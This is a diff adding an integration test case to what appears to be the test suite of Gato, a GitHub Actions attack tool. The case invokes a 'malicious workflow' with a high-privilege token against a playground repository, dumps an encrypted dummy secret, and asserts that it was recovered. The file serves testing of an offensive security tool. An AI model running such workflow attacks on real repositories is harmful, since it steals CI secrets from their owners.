@@ -339,5 +339,28 @@
                 "\"name\": \"GHRunnerPlayground/TestWF2\","
             ]
         }
-    }
+    },
+    {
+        "PAT": "ORG_ADMIN_REPO_WORKFLOW_TOKEN",
+        "invocation": "gato -s attack -t GHRunnerPlayground/TestWF --secrets --author-name Hackerman --author-email hacker@evilcorp.com --message AllYourSecretBelongToUs --delete",
+        "assertions": [
+            {
+                "expect": "The malicious workflow executed succesfully!",
+                "type": "stdout"
+            },
+            {
+                "expect": "Run echo -e \"DUMMY_TEST_SECRET=$DUMMY_TEST_SECRET \\n\" | openssl rsautl -encrypt -inkey <(echo",
+                "type": "stdout"
+            },
+            {
+                "expect": "The repository has 1 accessible secrets!",
+                "type": "stdout"
+            },
+            {
+                "expect": "DUMMY_TEST_SECRET=SUPER SECRET DUMMY VALUE",
+                "type": "stdout"
+            }
+        ],
+        "extra_validation": {"type":"none"}
+    },
 ]
